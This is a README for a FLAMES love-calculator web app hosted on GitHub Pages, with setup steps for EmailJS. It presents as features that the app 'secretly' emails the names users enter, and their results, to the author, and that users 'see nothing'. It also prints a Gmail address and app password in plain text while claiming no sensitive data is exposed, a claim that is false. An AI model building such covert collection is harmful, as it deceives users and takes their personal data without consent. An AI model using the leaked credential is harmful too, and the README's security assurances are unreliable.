# DemoDemoDemo - FLAMES Love Calculator 💕

A beautiful, animated FLAMES and Love Calculator that secretly sends results to your email.

## 🌟 Features

- **FLAMES Calculator**: Discover relationship compatibility 
- **Love Percentage**: Calculate love compatibility percentage
- **Beautiful UI**: Animated interface with floating hearts and sparkles
- **Mobile Responsive**: Works perfectly on all devices
- **Hidden Email**: Secretly sends results to your email (dragonofhorse666@gmail.com)
- **No Backend**: Pure client-side application using EmailJS

## 🚀 Quick GitHub Pages Deployment

### Step 1: Upload to GitHub
1. Create a new GitHub repository (name it anything, e.g., "demodemodemo")
2. Upload all these files to the repository:
   - `index.html`
   - `styles.css`  
   - `script.js`
   - `config.js`
   - `README.md`

### Step 2: Enable GitHub Pages
1. Go to your repository Settings → Pages
2. Select "Deploy from a branch"
3. Choose "main" branch and "/ (root)" folder
4. Click Save

**Your app will be live at:** `https://yourusername.github.io/repositoryname`

## 📧 Email Setup (Optional but Recommended)

To receive emails when users check names:

### Step 1: EmailJS Account
1. Go to [EmailJS.com](https://emailjs.com) and sign up for free
2. Create a Gmail service using your email: `dragonofhorse666@gmail.com`
3. Use your app password: `cype xzea ercm zqjk`

### Step 2: Create Email Template
Create a template with this content:
```
Subject: 💕 New FLAMES Result - {{name1}} & {{name2}}

Someone used DemoDemoDemo!

👤 Name 1: {{name1}}
👤 Name 2: {{name2}} 
💖 Love %: {{percentage}}
🔥 FLAMES: {{flames_result}}
📝 Result: {{description}}
🕒 Time: {{timestamp}}

Sent from DemoDemoDemo
```

### Step 3: Update Config
1. Open `config.js` in your repository
2. Replace `YOUR_EMAILJS_PUBLIC_KEY_HERE` with your EmailJS public key
3. Update service and template IDs if needed
4. Commit the changes

## 🎯 How It Works

1. **User enters two names** → Calculator shows results
2. **Results are displayed** → Beautiful animated interface  
3. **Email is sent secretly** → You receive the names and results
4. **User sees nothing** → Completely hidden email functionality

## 🛡️ Security & Privacy

- ✅ No sensitive data in public code
- ✅ Email sending through secure EmailJS
- ✅ App password safely stored in EmailJS dashboard
- ✅ No backend server required
- ✅ Client-side only application

## 📱 Mobile Friendly

The app is fully responsive and works beautifully on:
- 📱 Mobile phones
- 📟 Tablets  
- 💻 Desktop computers
- 🖥️ Large screens

## 🎨 Customization

You can easily customize:
- Colors in `styles.css`
- Animations and effects
- FLAMES result descriptions
- Love percentage algorithm

---

**App Name:** DemoDemoDemo  
**Email:** dragonofhorse666@gmail.com  
**Platform:** GitHub Pages  
**Framework:** Pure HTML/CSS/JavaScript + EmailJS
